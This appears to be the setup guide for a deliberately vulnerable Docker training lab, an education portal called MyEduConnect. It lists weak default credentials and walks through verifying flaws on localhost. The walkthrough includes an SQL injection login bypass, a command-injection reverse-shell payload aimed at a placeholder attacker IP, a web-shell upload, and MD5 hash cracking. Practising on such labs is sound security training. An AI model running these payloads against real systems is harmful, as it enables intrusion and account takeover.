# MyEduConnect — Setup Guide

## Prerequisites

- Docker Desktop (Windows/macOS) or Docker + Docker Compose (Linux)
- At least 2 GB RAM available for containers
- Ports 80, 22, 5432 free on the host

## Quick Start (3 commands)

```bash
git clone <repo-url> myeduconnect
cd myeduconnect
docker-compose up --build
```

Wait ~60 seconds for PostgreSQL to initialize, then open:

| URL | Description |
|-----|-------------|
| http://localhost/ | Student-facing web portal |
| http://localhost/admin/login | Admin panel (vulnerable to SQLi) |
| http://localhost/api/courses | REST API |
| http://localhost/api/students | REST API — IDOR endpoint |

## Default Credentials

### Student accounts
| Username | Password | Role |
|----------|----------|------|
| ali_hassan | password123 | student |
| siti_rahman | password123 | student |
| john_tan | password123 | teacher |

### Admin panel
| Username | Password |
|----------|----------|
| admin | admin123 |

### SSH (container)
| User | Password |
|------|----------|
| user | password123 |
| root | toor |

```bash
ssh user@localhost -p 22
```

### PostgreSQL (direct access)
```bash
psql -h localhost -p 5432 -U edu_admin -d myeduconnect
# password: Educ@2024!
```

## Container Architecture

```
nginx       → http://localhost:80       (reverse proxy)
app         → internal port 5000        (Flask + REST API)
db          → localhost:5432            (PostgreSQL)
ssh         → localhost:22              (Ubuntu SSH)
```

## Stopping the Platform

```bash
docker-compose down          # stop containers (keep DB data)
docker-compose down -v       # stop + delete DB volume (full reset)
```

## Rebuilding After Code Changes

```bash
docker-compose up --build app
```

## Verifying Vulnerabilities

### 1. SQL Injection — Admin login
```
URL: http://localhost/admin/login
Username: admin'--
Password: anything
Expected: bypasses authentication, logs in as admin
```

### 2. Command Injection — Reverse shell
```
# On attacker machine, start listener:
nc -lvnp 4444

# In admin panel → Network Tools → Host field:
127.0.0.1; bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1

# OR via API:
curl "http://localhost/api/ping?host=127.0.0.1%3B+bash+-i+>%26+/dev/tcp/<ATTACKER_IP>/4444+0>%261"
```

### 3. File Upload — Web shell
```
# Create a Python reverse shell file: shell.py
# Upload via: http://localhost/profile (must be logged in)
# Access at: http://localhost/static/uploads/shell.py
```

### 4. SSH Weak Credentials
```bash
ssh user@localhost -p 22
# password: password123
sudo su   # password: password123 (user is in sudo group)
```

### 5. MD5 Passwords (cracking)
```bash
# Connect to DB
psql -h localhost -p 5432 -U edu_admin -d myeduconnect -c "SELECT username, password_hash FROM users;"
# Hash: 482c811da5d5b4bc6d497ffa98491e38 = password123 (MD5)
# Crack with hashcat: hashcat -m 0 hashes.txt rockyou.txt
```

### 6. Exposed PostgreSQL
```bash
nmap -p 5432 localhost
psql -h localhost -p 5432 -U edu_admin myeduconnect -W
```

### 7. Cleartext HTTP (Wireshark)
```
Interface: lo (loopback) or Docker bridge interface
Filter: tcp.port == 80
Look for: POST /login (credentials in plaintext), API responses with PII
```
